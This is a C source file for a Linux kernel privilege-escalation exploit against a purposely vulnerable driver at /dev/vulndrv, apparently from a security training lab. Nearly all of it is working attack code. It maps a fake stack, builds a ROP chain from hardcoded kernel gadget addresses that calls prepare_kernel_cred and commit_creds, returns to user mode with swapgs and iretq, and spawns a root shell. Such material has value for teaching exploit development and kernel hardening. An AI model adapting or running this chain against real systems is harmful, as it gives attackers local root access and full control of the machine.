/** 
 * ROP exploit for drv.c kernel module
 *
 * gcc rop_exploit.c -O2 -o rop_exploit
 *
 * Email: vnik@cyseclabs.com
 * Vitaly Nikolenko
 */

#define _GNU_SOURCE
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/mman.h>
#include <assert.h>
#include "drv.h"

#define DEVICE_PATH "/dev/vulndrv"

unsigned long user_cs;
unsigned long user_ss;
unsigned long user_rflags;

static void save_state() {
	asm(
	"movq %%cs, %0\n"
	"movq %%ss, %1\n"
	"pushfq\n"
	"popq %2\n"
	: "=r" (user_cs), "=r" (user_ss), "=r" (user_rflags) : : "memory" 		);
}

void shell(void) {
	if(!getuid())
		system("/bin/sh");

	exit(0);
}


int main()
{
	int fd;
	struct drv_req req;
	fd = open(DEVICE_PATH, O_RDONLY);
	req.offset = -63800002;
	if (fd == -1) {
		perror("open");
	}
	//call &ops[req->offset] = base+offset*8 = 0xffffffff8193f0b0
	unsigned long  first_target = 0xffffffff8193f0b0;
	unsigned long fake_stack_addr = first_target&0xffffffff;
	fprintf(stdout, "stack address = 0x%lx\n", fake_stack_addr);
	unsigned long mmap_addr = fake_stack_addr & 0xffff0000;
	void * mapped,*temp_stack;
	fprintf(stdout,"mmap_addr = 0x%lx\n",mmap_addr);
	assert((mapped = mmap((void*)mmap_addr, 0x20000, 7, 0x32, 0, 0)) == (void*)mmap_addr);
	unsigned long * fake_stack = (unsigned long*)fake_stack_addr;
	assert((temp_stack = mmap((void*)0x30000000, 0x10000000, 7, 0x32, 0, 0)) == (void*)0x30000000);
	save_state();
	*fake_stack = 0xffffffff81010474;//pop rdi; ret;
	fake_stack_addr+=0xc00+8;
	fake_stack = (unsigned long *)fake_stack_addr;
	*fake_stack ++= 0;//NULL
	*fake_stack ++= 0xffffffff81073f70;//prepare_kernel_cred()
	*fake_stack ++= 0xffffffff812b0399;// mov rdi, rax; mov rax, rdi; pop rbx; pop rbp; ret;
	*fake_stack ++ = 0;//rbx
	*fake_stack ++ = 0;//rbp
	*fake_stack ++= 0xffffffff81073be0;// T commit_creds
	*fake_stack ++= 0xffffffff810464e4;//swapgs; pop rbp; ret;	
	*fake_stack ++= 0;
	*fake_stack ++= 0xffffffff8160beff;//iretq; inc dword ptr [rcx]; ret; 
	*fake_stack ++= (unsigned long)shell; /* spawn a shell */
	*fake_stack ++= user_cs;              /* saved CS */
	*fake_stack ++= user_rflags;          /* saved EFLAGS */
	*fake_stack ++= (unsigned long)(temp_stack+0x5000000);  /* mmaped stack region in user space */
	*fake_stack ++= user_ss;              /* saved SS */
	
	ioctl(fd, 0, &req);

	return 0;
}
